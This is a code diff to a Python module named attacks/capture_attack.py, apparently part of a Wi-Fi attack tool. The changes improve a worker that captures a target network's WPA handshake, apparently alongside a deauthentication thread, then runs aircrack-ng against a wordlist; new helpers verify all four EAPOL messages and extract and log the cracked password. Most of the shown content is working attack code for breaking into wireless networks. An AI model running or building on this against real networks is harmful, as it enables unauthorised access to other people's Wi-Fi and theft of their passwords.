@@ -1,11 +1,44 @@
 # attacks/capture_attack.py
 
 import os
+import re
 import time
 import subprocess
 import sys
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
 from web.shared import add_log_message_shared as add_log_message
+
+# Precompile ANSI escape matcher once (aircrack-ng emits cursor codes)
+ANSI_ESCAPE_PATTERN = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
+HANDSHAKE_MESSAGE_PATTERN = re.compile(r'Message\s+([1-4])\s+of\s+4', re.IGNORECASE)
+REQUIRED_EAPOL_MESSAGES = {1, 2, 3, 4}
+
+def parse_aircrack_password(raw_output):
+    """
+    Extract cracked password from aircrack-ng output.
+    Returns the password string or None if not found.
+    """
+    if not raw_output:
+        return None
+    clean_output = ANSI_ESCAPE_PATTERN.sub('', raw_output)
+    match = re.search(r'KEY FOUND!\s*\[([^\]]+)\]', clean_output)
+    if match:
+        return match.group(1).strip()
+    return None
+
+def has_full_wpa_handshake(tshark_output):
+    """
+    Returns (bool, set[int]) indicating whether all four WPA EAPOL messages are present.
+    """
+    if not tshark_output:
+        return False, set()
+    seen_messages = set()
+    for match in HANDSHAKE_MESSAGE_PATTERN.findall(tshark_output):
+        try:
+            seen_messages.add(int(match))
+        except ValueError:
+            continue
+    return REQUIRED_EAPOL_MESSAGES.issubset(seen_messages), seen_messages
 
 # --- Capture and Crack Function (for Thread) ---
 def capture_worker(target_bssid, target_channel, network_interface, timeout_duration, capture_prefix, capture_filepath, wordlist_path, stop_signal):
@@ -87,7 +120,8 @@ def capture_worker(target_bssid, target_channel, network_interface, timeout_dura
             tshark_command = ["tshark", "-r", capture_filepath, "-Y", "eapol"]
             result = subprocess.run(tshark_command, capture_output=True, text=True, check=True, timeout=20)
             output = result.stdout
-            if "EAPOL" in output:
+            handshake_complete, seen_messages = has_full_wpa_handshake(output)
+            if handshake_complete:
                 WPA_handshake_captured = True
                 add_log_message("[Capture Thread] ********** Handshake captured! **********")
                 stop_signal.set() # Signal the deauth thread to stop
@@ -113,7 +147,11 @@ def capture_worker(target_bssid, target_channel, network_interface, timeout_dura
                         # Use check=False as non-zero exit code might mean "not found" rather than error
                         crack_result = subprocess.run(aircrack_command, check=False, text=True,capture_output=True)
                         print(f"[Capture Thread] aircrack-ng finished with exit code {crack_result.returncode}.")
-                        add_log_message(f"[Capture Thread] aircrack-ng output: {crack_result.stdout}")
+                        password = parse_aircrack_password(crack_result.stdout)
+                        if password:
+                            add_log_message(f"[Capture Thread] Password found: {password}")
+                        else:
+                            add_log_message("[Capture Thread] Password not found in provided wordlist.")
                         # Basic check in output (aircrack specific, might need adjustment)
                         # if crack_result.stdout and "KEY FOUND!" in crack_result.stdout:
                         #     print("[Capture Thread] ---> Password likely found by aircrack-ng! <---")
@@ -127,7 +165,11 @@ def capture_worker(target_bssid, target_channel, network_interface, timeout_dura
                     except Exception as e:
                         add_log_message(f"[Capture Thread] An error occurred during aircrack-ng execution: {e}")
             else:
-                add_log_message(f"[Capture Thread] No Handshake Found in {capture_filepath}. Retrying scan...")
+                missing = sorted(REQUIRED_EAPOL_MESSAGES - seen_messages)
+                if missing:
+                    add_log_message(f"[Capture Thread] Partial EAPOL exchange detected (missing {missing}) in {capture_filepath}. Retrying scan...")
+                else:
+                    add_log_message(f"[Capture Thread] No Handshake Found in {capture_filepath}. Retrying scan...")
                 time.sleep(3)
 
         except subprocess.TimeoutExpired:
